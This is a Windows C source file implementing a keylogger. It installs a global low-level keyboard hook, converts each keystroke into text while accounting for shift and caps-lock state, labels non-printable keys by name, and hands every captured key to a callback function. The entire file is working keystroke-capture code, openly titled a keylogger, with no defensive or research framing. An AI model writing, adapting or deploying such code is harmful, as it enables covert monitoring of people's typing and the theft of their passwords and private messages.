#include "keylogger.h"

keyloggerCallback callback;
HHOOK keyboardHook = NULL;

u8 lShiftPressed = 0, rShiftPressed = 0, keyAfterShift = 1;
char chr[65] = {0};

int getKeyName(u32 vkCode, char* buffer, u32 size) {
    u32 vsc = MapVirtualKeyEx(vkCode, 0, GetKeyboardLayout(0)); //MAPVK_VK_TO_VSC
    switch (vkCode) {
        case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
        case VK_PRIOR: case VK_NEXT:
        case VK_END: case VK_HOME:
        case VK_INSERT: case VK_DELETE:
        case VK_DIVIDE:
        case VK_NUMLOCK: {
            vsc |= 0x100; //Set extended bit
            break;
        }
    }
    if (GetKeyNameText(vsc * 0x10000, buffer, size) == 0) {
        return 1;
    }
    return 0;
}

void dictionary(u32 key) {
    memset(chr, 0, 65);
    u8 test = MapVirtualKeyEx(key, 2, GetKeyboardLayout(0)); //MAPVK_VK_TO_CHAR
    if ((test >= 0x41 && test <= 0x5A) || (test >= 0x61 && test <= 0x7A) ||
        (test >= 0x80 && test <= 0x87 && test != 0x83 && test != 0x85) ||
        (test >= 0x8E && test <= 0x90) || test == 0x99 || test == 0x9A ||
        test == 0x94 || test == 0xA4 || test == 0xA5) {
        keyAfterShift = 1;
    }
    if ((test >= 0x20 && test <= 0xFE) && test != 0x7F) { //Check if is printable
        u8 isCap = 0;
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
            isCap = 1;
        }
        if (lShiftPressed == 1 || rShiftPressed == 1) {
            isCap = 1 - isCap;
        }
        chr[0] = test;
        if (isCap == 1) {
            _strupr(chr);
        } else {
            _strlwr(chr);
        }
        /*
        if (isCap == 0 && ((test >= 0x41 && test <= 0x5A) || (test >= 0xC0 && test <= 0xDF))) {
            test += 0x20; //if caps, check if has transformation (from capitalized key to no capitalized key)
        }
        if (isCap == 1 && ((test >= 0x61 && test <= 0x7A) || (test >= 0xE0 && test <= 0xFF))) {
            test -= 0x20; //Same as before but from uncapitalized to capitalized (special characters, rare cases)
        }
        */
    } else {
        char keyName[65];
        if (getKeyName(key, keyName, 65) == 1) {
            memset(keyName, 0, 65);
            strcpy(keyName, "UNKNOWN KEY");
        }
        chr[0] = '[';
        strcpy(chr + 1, keyName);
        chr[strlen(chr)] = ']';
    }
}

LRESULT CALLBACK keyloggerHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*) lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (key->vkCode == VK_LSHIFT) {
                lShiftPressed = 1;
                keyAfterShift = 0;
            } else if (key->vkCode == VK_RSHIFT) {
                rShiftPressed = 1;
                keyAfterShift = 0;
            } else {
                dictionary(key->vkCode);
                callback(chr);
            }
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            if (key->vkCode == VK_LSHIFT) {
                lShiftPressed = 0;
                if (keyAfterShift == 0) {
                    keyAfterShift = 1;
                    dictionary(key->vkCode);
                    callback(chr);
                }
            } else if (key->vkCode == VK_RSHIFT) {
                rShiftPressed = 0;
                if (keyAfterShift == 0) {
                    keyAfterShift = 1;
                    dictionary(key->vkCode);
                    callback(chr);
                }
            }
        }
    }
    return CallNextHookEx(keyboardHook, code, wParam, lParam);
}

void startKeylogger(HINSTANCE hInstance, keyloggerCallback cb) {
    callback = cb;
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyloggerHook, hInstance, NULL);
    MSG msg;
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
}
